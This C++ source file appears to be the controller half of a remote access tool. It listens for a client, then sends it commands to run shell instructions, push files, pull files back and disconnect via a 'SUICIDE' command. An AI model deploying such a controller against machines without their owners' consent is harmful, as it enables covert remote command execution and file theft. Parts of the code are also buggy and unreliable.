#include "entry.h"
#include "MyServer.h"
#include <iostream>
#include "Command.h"
#include <io.h>
#include <fcntl.h>
#include <limits>

#define IP "127.0.0.1"
#define PORT 65533
#define HEARTBEAT_TIME 10000
#define CMDSIZE 8192
#define FILE_PATH_LEN 256

HANDLE HeartBeat = NULL;
MySocket* myServer = NULL;
HANDLE hMutex = NULL;

DWORD WINAPI RecvHeartBeat(LPVOID lpThreadParameter) {
	MySocket* s = (MySocket*)lpThreadParameter;
	// 创建一个新类
	MySocket* RecvHB = s->New();

	while (true) {
		Sleep(HEARTBEAT_TIME);
		if (!RecvHB->MyRecvHeartBeat()) {
			RecvHB->FreeCopy();
			std::wcout << L"Recv HeartBeat Failed \n";
			std::wcout << L"Maybe Client disconnected \n";
			return 1;
		}
		std::wcout << L"Recv HeartBeat Success\n";

	}
	return 0;
}

bool Entry() {
	// 主线程
	myServer = new MySocket;
	hMutex = CreateMutex(NULL, NULL, NULL);
	// 初始化
	if (!myServer->SocketInit(hMutex)) {
		std::wcout << L"SocketInit Error\n";
		return false;
	}
reConnect:
	std::wcout << L"Wait for client connect\n";
	// 开始监听
	if (!myServer->Listen(PORT)) {
		std::wcout << L"Listen Error\n";
		return false;
	}
	// 接收连接
	if (!myServer->Accept()) {
		std::wcout << L"Accept Error\n";
		return false;
	}
	// 接收客户端发送来的PC信息
	if (!myServer->RecvMsg()) {
		std::wcout << L"Recv PC Msg error\n";
		return false;
	}
	// 创建接收心跳包的线程
	//HeartBeat = CreateThread(
	//	NULL, 0, (LPTHREAD_START_ROUTINE)RecvHeartBeat, (LPVOID)myServer, 0, NULL
	//);

	//if (HeartBeat == NULL) {
	//	std::wcout << L"Create Thread Error :" << GetLastError() << "\n";
	//	return false;
	//}

	// 输入并发送指令
	UINT32 command = 0;
	wchar_t* Instruction = new wchar_t[CMDSIZE];
	char* recvbuf = new char[CMDSIZE];
	wchar_t* Res = new wchar_t[CMDSIZE];
	char* FileBuf = NULL;
	std::wcout << L"Please input the correct command:\n";
	std::wcout << L"Input 0 to get the help\n";
	while (true) {

		while (true) {
			std::cin >> command;

			// 检查输入是否有效
			if (command != HELP			&&
				command != CMD			&&
				command != UPLOAD		&&
				command != DOWNLOAD		&&
				command != SCREENSHOT	&&
				command != SUICIDE) {
				std::cout << L"Incorrect command, please input correct command！" << std::endl;

				// 清除错误状态和缓冲区
				rewind(stdin);
				std::cin.clear();
			}
			else {
				break;
			}
		}
		if (!myServer->SendCommand(command)) {
			std::wcout << L"Send Command Error: " << WSAGetLastError() << "\n";
			return false;
		}
		rewind(stdin);
		switch (command) {
		case HELP: {
			std::wcout << L"0 -> Help\n";
			std::wcout << L"1 -> Execute the cmd instruction(such as cmd.exe /c cd../ && dir)\n";
			std::wcout << L"2 -> Upload file to client\n";
			std::wcout << L"3 -> Download file from client\n";
			std::wcout << L"4 -> Get the screenshot of client\n";
			std::wcout << L"5 -> Disconnect with client\n";
			break;
		}
		case CMD: {
			std::wcout << L"Please input correct cmd instruction:\n";
			// 初始化
			ZeroMemory(Instruction, CMDSIZE * sizeof(wchar_t));
			// 读取cmd指令
			std::wcin.getline(Instruction, CMDSIZE);
			rewind(stdin);
			std::wcout << L"Input cmd command end\n";
			// 发送
			if (!myServer->SendCmd(Instruction, recvbuf)) {
				std::wcout << L"Send cmd command error: " << WSAGetLastError() << "\n";
				return false;
			}
			// 接收
			if (!myServer->RecvCmd(Res, recvbuf)) {
				std::wcout << L"Recv cmd command error" << WSAGetLastError() << "\n";
				return false;
			} {
				// 输出发送来的执行结果
				// 获取原始控制台输出编码
				UINT originalOutputCP = GetConsoleOutputCP();
				// 设置控制台输出编码为UTF-16
				SetConsoleOutputCP(CP_UTF8);
				int res = 0;
				// 将 stdout 设置为宽字符流
				res = _setmode(_fileno(stdout), _O_U16TEXT);
			
				std::wcout << Res << "\n";
				// 恢复控制台输出编码为默认编码
				SetConsoleOutputCP(originalOutputCP);
				// 将 stdout 重置为默认模式
				res = _setmode(_fileno(stdout), _O_TEXT);
				//std::wcout << std::noskipws << Res;
				std::wcout << L"\nRecv result end\n";
			}
			break;
		}
		case UPLOAD: {
			// 文件路径
			wchar_t* path = new wchar_t[FILE_PATH_LEN];
			// 文件长度
			UINT32 len = 0;
			ZeroMemory(path, FILE_PATH_LEN * sizeof(wchar_t));

			// 先获取需要上传到client的本地文件路径
			std::wcout << L"Please enter the server file path\n";
			rewind(stdin);
			// D:\vsfiles\MySocket\Server\TESTFILE.txt
			std::wcin.getline(path, FILE_PATH_LEN);
			rewind(stdin);

			// 输入的文件路径过长
			if (wcslen(path) > FILE_PATH_LEN) {
				std::wcout << L"File path too long\n";
				break;
			}

			if (!myServer->ReadFromFile(path, &len, &FileBuf)) {
				std::wcout << L"ReadFromFile Error \n";
				return false;
			}

			// 上传的文件路径
			ZeroMemory(path, FILE_PATH_LEN * sizeof(wchar_t));
			std::wcout << L"Please enter the client file path\n";
			rewind(stdin);
			// D:\test.txt
			std::wcin.getline(path, FILE_PATH_LEN);
			rewind(stdin);

			// 输入的文件路径过长
			if (wcslen(path) > FILE_PATH_LEN) {
				std::wcout << L"File path too long\n";
				break;
			}
			// 发送目标文件的路径
			if (!myServer->SendCmd(path, recvbuf)) {
				std::wcout << L"Send file path error" << WSAGetLastError() << "\n";
				return false;
			}

			// 再发送文件
			if (!myServer->SendFile(FileBuf, len)) {
				std::wcout << L"Send File Error \n";
				return false;
			}

			delete[] path;
			delete[] FileBuf;

			break;
		}
		case DOWNLOAD: {
			// 先输入要下载的文件在客户端中的完整路径
			wchar_t* path = new wchar_t[FILE_PATH_LEN];
			ZeroMemory(path, FILE_PATH_LEN * sizeof(wchar_t));

			std::wcout << L"Please enter the client file path\n";
			rewind(stdin);
			std::wcin.getline(path, FILE_PATH_LEN);
			rewind(stdin);
			// D:\test.txt
			//std::wcout << "Path is " << path << "\n";

			// 将文件路径发送给客户端
			if (!myServer->SendCmd(path, recvbuf)) {
				std::wcout << L"Send file path error" << WSAGetLastError() << "\n";
				return false;
			}

			// 再new文件的空间
			FileBuf = new char[FILEBUFFERLEN * sizeof(char)];
			ZeroMemory(FileBuf, FILEBUFFERLEN * sizeof(char));

			// 先接收客户端发来的标志， 如果是1表明文件路径输入错误， 2表示文件读入失败，0表示文件正常读入
			UINT32 flag = -1;
			if (!myServer->RecvIns(&flag)) {
				std::wcout << L"Recv Ins Error %d\n" << WSAGetLastError() << "\n";
				return false;
			}
			// 成功将客户端文件读入就接收
			if (flag == SUCCESS) {
				// 接收客户端发送来的文件
				if (!myServer->RecvFile(FileBuf, FILEBUFFERLEN)) {
					std::wcout << L"Recv File error %d\n" << WSAGetLastError() << "\n";
					return false;
				}
				// 写入server路径
				wchar_t WritePath[] = L"Client file.txt";
				if (!myServer->WriteToFile(FileBuf, WritePath)) {
					std::wcout << L"write to file error %d\n" << GetLastError() << "\n";
					return false;
				}
			}
			// 没有这样的文件
			else if (flag == NOSUCHFILE) {
				std::wcout << L"Open File Error, Maybe there not have this file, please input the correct client file path\n";
				break;
			}
			// 读取失败
			else if (flag == READERROR) {
				std::wcout << L"Read File To buf error, maybe this file size is too large\n";
				break;
			}
			std::wcout << L"Recv Client File Success\n";
			delete[] path;
			break;
		}
		case SCREENSHOT: {
			break;
		}
		case SUICIDE: {
			wchar_t* Suicide = (wchar_t*)L"SUICIDE";
			if (!myServer->Send(Suicide)) {
				// 断开与客户端的连接,重新进入监听状态
				//Sleep(HEARTBEAT_TIME);
				Sleep(HEARTBEAT_TIME);
				myServer->Free();
				goto reConnect;
			}
			break;
		}

		default:
			std::wcout << L"Incorrect command\n";
			break;
		}
	}
	delete[] Res;
	delete[] recvbuf;
	delete[] Instruction;
	//delete[] FileBuf;
	system("pause");

	delete myServer;
}
